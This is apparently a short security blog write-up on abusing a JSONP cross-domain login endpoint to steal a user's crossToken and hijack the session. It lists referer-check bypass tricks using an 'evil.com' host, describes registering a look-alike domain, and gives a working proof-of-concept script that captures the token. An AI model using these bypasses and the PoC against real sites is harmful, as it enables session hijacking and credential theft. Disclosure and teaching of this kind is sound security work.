---
layout: single
title:  "Abusing JSONP to grab user credentials"
---

I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow:
```
GET /api/cross/getsign?callback=test HTTP/1.1
Host: portal.domain.com
Referer: http://www.otherdomain.com

HTTP/1.1 200 OK
test(crossToken)
```
```
POST /api/cross/getsign HTTP/1.1
Host: www.otherdomain.com

crossToken=[crossToken]

HTTP/1.1 200 OK
set-cookie: session=xxxxxxxxxxxxxxxxxxxxxxx
```
The company prevents the JSONP injection via referer check. 

some common referer check  byapss tricks:
- notdomian.com
- domain.com.evil.com
- evil.com/domain.com
- send a blank referer

Fortunately, I can bypass it using nototherdomain.com. Then  I buy it and host the malicious code there. So, I can steal the victims' crossToken and hijack their session.


POC:
```
<script type="text/javascript">
function test(data) {
    var crossToken = data;
    document.write('crossToken=' + encodeURIComponent(crossToken));
}
</script>
<script src="http://portal.domain.com/api/cross/getsign?callback=test"></script>
```

Further reading:
- [Practical JSONP Injection](https://securitycafe.ro/2017/01/18/practical-jsonp-injection/)
- [Tutorial Five: Bypassing CSRF protection](https://zseano.com/tutorials/5.html)
- [Backdoor of All Flickr API Calls by XSSI](https://ngailong.wordpress.com/2017/08/11/open-door-to-all-flickr-api-calls-by-xssi/)


